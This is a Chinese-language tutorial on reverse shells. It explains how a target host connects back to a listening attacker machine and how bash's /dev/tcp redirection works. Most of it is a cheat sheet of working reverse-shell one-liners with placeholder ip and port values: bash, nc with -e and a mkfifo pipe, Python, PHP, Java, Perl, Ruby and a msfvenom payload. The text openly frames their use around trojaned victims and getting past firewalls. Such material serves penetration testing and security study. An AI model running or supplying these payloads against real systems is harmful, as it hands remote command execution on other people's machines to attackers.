# 反弹shell



## 前言
反弹shell（reverse shell）是控制端（攻击机）监听TCP/IP端口，而被控制端（目标主机）发送请求连接该端口，并将命令行的输入输出转到控制端。反弹shell与telnet，ssh等标准shell对应，其本质就是将网络概念中的客户端和服务端互换。

<br/>

## 反弹shell
通常用于被控端因防火墙受限、权限不足、端口被占用等情形。
举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？

有如下情况：
- 某客户机中了你的网马，但是它在局域网内，你直接连接不了。 
- 目标机器的ip动态改变，你不能持续控制。
- 由于防火墙等限制，对方机器只能发送请求，不能接收请求。
- 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。

那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

来源：[玄魂](https://www.zhihu.com/question/24503813)

<br/>

## 反弹shell原理

使用反弹shell之前，需要先来了解一下Linux的文件描述符，在linux启动后，会默认打开3个文件描述符：
- 0 - stdin 标准输入  输入重定向 `<` 或 `<<`
- 1 - stdout 标准输出 输出重定向 `>` 或 `>>`
- 2 - stderr 标准错误输出 错误输出重定向 `2>` 或 `2>>`

<br/>

因为在Linux中一切皆是文件，所以可以利用文件描述符来进行文件输入输出的重定向，这里注重了解`>&`这个符号
- 当`>&`后面接文件时，表示将标准输出和标准错误输出重定向至文件
- 当`>&`后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符

<br/>

现在以一个反弹shell的语句为例，在攻击机终端输入监听端口的命令
```bash
nc -lvvp port	# port表示监听的端口
```
目标主机（靶机）终端输入命令
```bash
bash -i >& /dev/tcp/ip/port  0>&1	#ip是攻击机的ip，port 为攻击机监听的端口号
```
这样就可以在攻击机获得一个反弹shell了。现在来解释这两条bash命令：

`nc -lvvp port`：
nc表示netcat，`-l`监听，`-v`输出交互或错误信息，`-p`指定端口

`bash -i >& /dev/tcp/ip/port  0>&1`：
`bash -i`表示在本地开启一个bash（shell）， `/dev/tcp/`是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接。`>&`后面跟着`/dev/tcp/ip/port`代表将标准输出和标准错误输出通过soket连接重定向到攻击机，如果此时攻击机监听对应的端口，那么就会收到目标主机的标准输出和标准错误输出。最后`0>&1`将标准输入重定向到标准输出，因为标准输出已经重定向到攻击机的指定端口，所以现在标准输入也是重定向到攻击机。那么现在攻击机就获得一个标准的shell，一次反弹shell就这样完成。

<br/>

## 其他方法
了解完反弹shell的使用原理就可以尝试用其他方法来实现反弹shell，但归根到底其本质还是一样的，都是通过重定向让攻击机终端获取目标主机的标准输入/输出。以下`ip`均指发起攻击机ip，`port`为未被占用的端口。同时攻击机均处于监听状态（`nc -lvvp port`）。


### nc
在使用nc进行反弹shell，需要目标主机安装nc
```bash
nc -e /bin/bash ip port 
```
但是出于安全考虑，很多Linux版本的nc并没有`-e`这个选项，但是仍然可以实现反弹shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f
```
mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Php
使用php的fsockopen实现反弹shell
```php
php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```
### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Perl
```perl
perl -e 'use Socket;$i="ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ip:port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

###  Ruby
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### msfvenom
msfvenom可以直接生成反弹shell，通过`-l`和`grep` 筛选列出对应的反弹shell `msfvenom -l payloads | grep 'cmd/unix/reverse'` 
在目标主机终端输入msfvenom生成的payload，攻击机在监听状态下就可以获取一个反弹shell
```bash
 msfvenom -p 'cmd/unix/reverse_netcat' lhost=ip lport=port
```


<br/>

## 参考


https://www.freebuf.com/articles/system/178150.html
https://www.anquanke.com/post/id/87017
https://xz.aliyun.com/t/2549#toc-1

